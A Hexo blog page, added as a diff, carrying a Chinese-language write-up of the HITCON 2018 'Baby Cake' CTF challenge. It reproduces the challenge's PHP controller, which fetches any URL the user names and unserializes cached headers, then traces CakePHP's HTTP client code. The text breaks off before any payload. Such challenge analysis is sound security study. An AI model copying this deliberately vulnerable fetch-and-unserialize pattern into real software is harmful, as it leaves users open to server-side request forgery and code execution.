@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Orange的一道代码审计题目，整个比赛期间的第一道web题，鄙人也认为是很难的一道题(1700多个队只解出来4个)，赛后看了PDKT的题解，发现有很多可以在代码审计中学习的地方，还用到了前段时间在BlackHat USA上新提出的PHP反序列化技术，这里将分析一波。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hitcon 2018 BabyCake Writeup">
+<meta property="og:url" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/index.html">
+<meta property="og:site_name" content="Shadow Gallery">
+<meta property="og:description" content="Orange的一道代码审计题目，整个比赛期间的第一道web题，鄙人也认为是很难的一道题(1700多个队只解出来4个)，赛后看了PDKT的题解，发现有很多可以在代码审计中学习的地方，还用到了前段时间在BlackHat USA上新提出的PHP反序列化技术，这里将分析一波。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231318.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231423.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231604.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231609.png">
+<meta property="article:published_time" content="2018-10-27T15:07:21.000Z">
+<meta property="article:modified_time" content="2020-08-11T08:44:37.584Z">
+<meta property="article:author" content="Srpopty">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png">
+
+<link rel="canonical" href="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>Hitcon 2018 BabyCake Writeup | Shadow Gallery</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shadow Gallery</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Live in the shadow</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Srpopty">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shadow Gallery">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hitcon 2018 BabyCake Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-10-27 23:07:21" itemprop="dateCreated datePublished" datetime="2018-10-27T23:07:21+08:00">2018-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-11 16:44:37" itemprop="dateModified" datetime="2020-08-11T16:44:37+08:00">2020-08-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">Orange的一道代码审计题目，整个比赛期间的第一道web题，鄙人也认为是很难的一道题(1700多个队只解出来4个)，赛后看了PDKT的题解，发现有很多可以在代码审计中学习的地方，还用到了前段时间在BlackHat USA上新提出的PHP反序列化技术，这里将分析一波。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Baby-Cake"><a href="#Baby-Cake" class="headerlink" title="Baby Cake"></a>Baby Cake</h1><blockquote>
+<p>Get the shell plz!!!!!</p>
+</blockquote>
+<p>题目简单明了，直接给了全部源码(不像某些国内垃圾比赛全靠脑洞做题)，整个网站实现的功能就是根据url参数去请求目标网页，如果是Get的话会存cache在本地，Post的话将会直接把data参数post到目标网站，并且不会保存cache。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png" alt></p>
+<h2 id="本地任意文件读取"><a href="#本地任意文件读取" class="headerlink" title="本地任意文件读取"></a>本地任意文件读取</h2><p>网站使用了CakePHP框架，对目标url的请求也是调用了CakePHP的API，整站的源码打包下载下来，解压出来有快30个M…目录结构也非常复杂。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231318.png" alt><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231423.png" alt></p>
+<p>查看CakePHP的文档找到<a href="https://book.cakephp.org/2.0/zh/getting-started/cakephp-folder-structure.html" target="_blank" rel="noopener">目录结构</a></p>
+<p>这里重点关注src以及vendor目录，controller位于src目录下<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231604.png" alt><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231609.png" alt></p>
+<p>src保存网站源码，而vendor则保存所有的第三方库，其中包括了CakePHP的源码。整个网站主要源码位于<code>/src/Controller/PagesController.php</code>里，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($headers, $body)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = $headers;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body = $body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">'headers'</span> =&gt; $headers, </span><br><span class="line">            <span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'pages'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">        $index = sprintf(<span class="string">'mycache/%s/%s/'</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">($key, $response)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="keyword">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"body.cache"</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"headers.cache"</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">"/body.cache"</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">"/headers.cache"</span>);</span><br><span class="line"></span><br><span class="line">            $body = <span class="string">"&lt;!-- from cache --&gt;\n"</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;</span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">'http'</span>, <span class="string">'https'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">'get'</span>, <span class="string">'post'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'patch'</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">'host'</span>, <span class="string">'connection'</span>, <span class="string">'expect'</span>, <span class="string">'content-length'</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">'content-type'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">'type'</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">'type'</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要逻辑在display函数中，这里只关心输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;</span><br><span class="line">	 $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">	 $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">	 $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">	...</span><br><span class="line">	$key = md5($url);</span><br><span class="line">	<span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123; <span class="comment">// 如果是GET</span></span><br><span class="line">		$response = <span class="keyword">$this</span>-&gt;cache_get($key); <span class="comment">// 尝试获取本地缓存</span></span><br><span class="line">		<span class="keyword">if</span> (!$response) &#123; <span class="comment">// 没有缓存则直接远程请求</span></span><br><span class="line">			$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cache_set($key, $response); <span class="comment">// 将请求结果放到缓存中</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; <span class="comment">// POST不缓存，直接带着data请求</span></span><br><span class="line">		$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里的请求方式调用了<code>httpclient($method, $url, $headers, $data)</code>函数，下面看看这个函数做了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">	$options = [</span><br><span class="line">		<span class="string">'headers'</span> =&gt; $headers,</span><br><span class="line">		<span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">	];</span><br><span class="line">	$http = <span class="keyword">new</span> Client();</span><br><span class="line">	<span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>在这个函数中才真正调用了CakePHP的远程请求API<code>$http-&gt;$method($url, $data, $options)</code>，跟进到CakePHP的API中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$http = <span class="keyword">new</span> Client();</span><br><span class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br></pre></td></tr></table></figure>
+
+
+<p>Client类是从<code>Cake\Http\Client</code>中调用的，这个类位于<code>\vendor\cakephp\cakephp\src\Http\Client.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;setConfig($config);</span><br><span class="line"></span><br><span class="line">	$adapter = <span class="keyword">$this</span>-&gt;_config[<span class="string">'adapter'</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;setConfig(<span class="string">'adapter'</span>, <span class="keyword">null</span>);</span><br><span class="line">	<span class="keyword">if</span> (is_string($adapter)) &#123;</span><br><span class="line">		$adapter = <span class="keyword">new</span> $adapter();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_adapter = $adapter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;_config[<span class="string">'cookieJar'</span>])) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">$this</span>-&gt;_config[<span class="string">'cookieJar'</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;setConfig(<span class="string">'cookieJar'</span>, <span class="keyword">null</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">new</span> CookieCollection();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a GET request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* The $data argument supports a special `_content` key</span></span><br><span class="line"><span class="comment">* for providing a request body in a GET request. This is</span></span><br><span class="line"><span class="comment">* generally not used, but services like ElasticSearch use</span></span><br><span class="line"><span class="comment">* this feature.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $data The query data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">	$body = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'_content'</span>])) &#123;</span><br><span class="line">		$body = $data[<span class="string">'_content'</span>];</span><br><span class="line">		<span class="keyword">unset</span>($data[<span class="string">'_content'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	$url = <span class="keyword">$this</span>-&gt;buildUrl($url, $data, $options);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(</span><br><span class="line">		Request::METHOD_GET,</span><br><span class="line">		$url,</span><br><span class="line">		$body,</span><br><span class="line">		$options</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>post函数</p>
